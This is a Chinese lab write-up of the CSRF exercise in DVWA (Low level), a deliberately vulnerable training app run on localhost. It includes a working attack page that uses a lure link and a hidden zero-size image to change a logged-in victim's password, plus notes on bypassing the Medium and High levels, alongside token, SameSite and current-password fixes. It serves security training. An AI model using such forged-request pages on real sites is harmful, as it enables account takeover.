# CSRF 跨站请求伪造 — DVWA Low

!!! info "环境信息"

    靶场：DVWA（XAMPP + Apache + MariaDB）
    难度：Low
    地址：`http://localhost/dvwa/vulnerabilities/csrf/`
    工具：浏览器开发者工具（或 Burp Suite）
    目标：在不接触受害者浏览器的前提下，替受害者修改密码

---

## 一、漏洞原理

DVWA 的 CSRF 模块功能很简单：输入两次新密码，点 Change，密码就被改掉。

**它的请求长这样**（从开发者工具或 Burp 里抓到）：

```http
GET /dvwa/vulnerabilities/csrf/?password_new=132465&password_conf=132465&Change=Change HTTP/1.1
Host: localhost
Cookie: security=low; PHPSESSID=957004bo92a68a3go10agto70l
```

这一个请求暴露了**三个致命问题**：

| # | 问题 | 后果 |
|---|---|---|
| 1 | **改密码用 GET 请求** | GET 应当是「只读」的，任何 `<img>`、`<a>` 都能触发 |
| 2 | **新密码放在 URL 里** | 会进浏览器历史、服务器访问日志、Referer 头 |
| 3 | **没有任何 Token 校验** | 只要浏览器带着有效 Cookie，服务器就认这个请求 |

**第 3 条是 CSRF 的本质。**

服务器的验证逻辑是：

```
Cookie 有效？ → 是 → 执行操作
```

它**没有验证**：

```
这个请求是用户本人主动发起的吗？
```

浏览器有一条规则：**只要请求发往 `localhost`，就自动带上 `localhost` 的 Cookie。**
攻击者利用的就是这条规则——**让受害者的浏览器替他发请求**。

---

## 二、利用过程

### 第 1 步：正常操作，抓请求

登录 DVWA（`admin` / `password`），进入 **CSRF** 模块，输入新密码并点击 Change。

返回：

```
Password Changed
```

**打开开发者工具（F12）→ Network 标签 → 找到那个请求**，观察它的结构。

**关键观察**：地址栏变成了

```
http://localhost/dvwa/vulnerabilities/csrf/?password_new=132465&password_conf=132465&Change=Change
```

**密码明文在 URL 里，而且是 GET。** 这就是漏洞入口。

### 第 2 步：确认无 Token 防护

检查请求参数——**只有三个**：`password_new`、`password_conf`、`Change`。

**没有 `user_token`、没有 `csrf_token`、没有任何随机值。**

意味着：攻击者只要知道这三个参数名，就能构造出一模一样的请求。

### 第 3 步：构造攻击页面

新建文件 `attack.html`：

```html
<html>
<body>
  <h1>恭喜你中奖了！点击下方领取</h1>

  <!-- 方式一：诱导点击 -->
  <a href="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
    点我领奖
  </a>

  <!-- 方式二：完全无感，自动触发 -->
  <img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change"
       width="0" height="0">
</body>
</html>
```

!!! tip "为什么用 `<img>`"

    图片能不能加载成功**无所谓**——请求已经发出去了。

    这是 CSRF 攻击的经典手法：**受害者看不到任何异常，密码已经被改。**

### 第 4 步：投递并验证

1. 确保浏览器**处于已登录 DVWA 的状态**
2. 用**同一个浏览器**打开 `attack.html`
3. 回到 DVWA 的 CSRF 模块

结果：

```
Password Changed
```

**攻击成功。** 受害者只是"打开了一个网页"，密码就被改成了 `hacked`。

**验证**：用 `admin` / `hacked` 能登录，说明密码真的被改了。

---

## 三、为什么能成功

完整的攻击链条：

```
受害者已登录 DVWA，浏览器持有有效 PHPSESSID
            ↓
受害者访问了攻击者的页面（任意来源）
            ↓
页面里的 <img> 向 localhost/dvwa/... 发起请求
            ↓
浏览器自动附上 localhost 的 Cookie（同源策略不管这个）
            ↓
服务器：Cookie 有效 → 执行改密
            ↓
受害者毫无感知
```

**核心问题**：服务器把「Cookie 有效」等同于「用户本意」。
但 Cookie 是浏览器**自动附带**的，不是用户主动出示的。

---

## 四、修复建议

### 方案 1：CSRF Token（标准解法）

在表单里放一个服务端生成的随机值：

```php
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

```html
<input type="hidden" name="user_token" value="<?= $_SESSION['csrf_token'] ?>">
```

服务端提交时校验：

```php
if (!hash_equals($_SESSION['csrf_token'], $_POST['user_token'] ?? '')) {
    die('CSRF token mismatch');
}
```

**为什么有效**：攻击者的页面**读不到**受害者浏览器里的 token（受同源策略保护），
所以无法构造出合法请求。

!!! warning "注意"

    Token 必须**服务端生成、服务端校验**，而且每次会话（或每次请求）都不同。

    如果 token 是前端 JS 生成的、或者固定不变，等于没加。

### 方案 2：修改敏感信息必须验证原密码（业务层最有效）

改密码、改邮箱、转账这类操作，要求输入**当前密码**：

```php
if (!password_verify($_POST['current_password'], $user['password'])) {
    die('Current password incorrect');
}
```

**攻击者不知道原密码，这一步就卡死了。** 比 token 更根本，因为它验证的是「身份」而不是「来源」。

### 方案 3：敏感操作改用 POST

```html
<form method="POST" action="/change-password">
```

GET 语义上应当是**幂等、只读**的。让 GET 产生副作用，本身就是设计错误。

> 注意：**改成 POST 不能单独防住 CSRF**——攻击者可以用一个自动提交的表单达到同样效果。POST 是必要但不充分的。

### 方案 4：Cookie 设置 SameSite

```php
session_set_cookie_params([
    'samesite' => 'Lax',   // 或 Strict
    'httponly' => true,
    'secure'   => true,    // 仅 HTTPS
]);
```

| 值 | 效果 |
|---|---|
| `Strict` | 跨站请求完全不带 Cookie，最安全但影响正常跳转体验 |
| `Lax` | 跨站的 GET 请求不带 Cookie（现代浏览器默认值） |
| `None` | 跨站也带，必须配合 `Secure`，**不要用** |

**这是浏览器层面的防护**，成本最低，但需要用户浏览器支持（现代浏览器都支持）。

### 方案 5：校验 Origin / Referer 头（辅助）

```php
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
if ($origin !== 'http://localhost') {
    die('Invalid origin');
}
```

**只能作为补充**。Referer 可能被隐私设置或代理剥离，Origin 在某些场景也不发送。

---

## 五、Low / Medium / High 的防护演进

DVWA 各难度的防护逻辑（值得对比着看）：

| 难度 | 防护手段 | 绕过方式 |
|---|---|---|
| **Low** | 无 | 直接利用 |
| **Medium** | 校验 `Referer` 是否包含主机名 | 把攻击页面命名为 `localhost.html`，或放在 `localhost` 路径下 |
| **High** | 加入 CSRF Token | 需要配合其他漏洞（如 XSS）窃取 token |
| **Impossible** | Token + 验证原密码 | 标准解法，无可绕过 |

**这张表比"我打过 Low"有价值得多**——它说明防护强度是可以分层的，
而且**单独的 `Referer` 校验是脆弱的**。

---

## 六、总结

| 要点 | 结论 |
|---|---|
| 漏洞本质 | 服务器无法区分「用户本意」和「浏览器自动请求」 |
| 根本修复 | CSRF Token + 敏感操作验证原密码 |
| 常见误判 | 「改成 POST 就安全了」——错，还需要 token |
| 检测思路 | 看请求里有没有不可预测的随机值 |

**我在这关学到的**：

防 CSRF 的核心不是「检查请求长什么样」，而是**让攻击者无法构造出合法请求**。
Token 就是这个「无法预测的值」——它把「Cookie 有效」升级成了「Cookie 有效 **且** 请求来自合法页面」。

另一个体会是：**改密码不验原密码，是个业务设计漏洞，不只是技术漏洞。**
很多真实系统栽在这里，而不是栽在没加 token 上。

---

## 参考

- DVWA 官方仓库：<https://github.com/digininja/DVWA>
- OWASP CSRF 防护速查表：<https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
- PortSwigger CSRF 专题：<https://portswigger.net/web-security/csrf>
